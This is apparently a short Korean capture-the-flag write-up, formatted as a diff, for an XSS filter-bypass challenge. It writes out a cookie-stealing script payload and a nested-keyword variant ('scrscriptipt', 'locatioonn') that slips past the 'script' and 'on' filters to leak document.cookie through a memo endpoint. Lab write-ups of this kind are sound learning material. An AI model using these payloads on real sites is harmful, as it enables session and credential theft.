@@ -1,0 +1,27 @@
+app.py 실행 후 코드 분석
+
+쿠키 값에 FLAG가 있다
+
+script on javascript 가 필터링 되어있다. 
+
+필터링이 없다는 가정하에
+
+<script>location.href="127.0.0.1:8000/memo?memo=hello"+document.cookie</script>
+방식의 XSS 공격을 시도 했다. 
+
+당연히 필터링에 막혔다.
+
+Dreamhack의 xss-filtering-bypass-1 을 참고하였다.
+
+<scrscriptipt>locatioonn.href="/memo?memo=hello"+document.cookie</scrscriptipt>
+으로 필터링을 피해보았다.
+
+아 근데 127.0.0.1:8000 하니까 실패하였다..
+아니 코드엔 http://127.0.0.1:8000/vuln?param=~ 라메..
+허허
+
+아 check_xss.. 
+
+암튼 결국 flag를 얻는데 성공!
+
+필터링 찾는데 시간 좀 많이 걸린듯...
